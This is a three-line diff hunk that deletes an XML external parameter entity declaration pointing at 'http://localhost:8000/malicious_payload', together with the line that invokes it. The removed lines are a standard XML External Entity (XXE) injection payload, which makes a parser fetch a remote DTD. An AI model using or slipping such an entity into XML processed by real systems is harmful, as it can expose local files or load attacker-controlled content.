@@ -1,3 +1,0 @@
-<!ENTITY % remote SYSTEM "http://localhost:8000/malicious_payload">
-%remote;
-
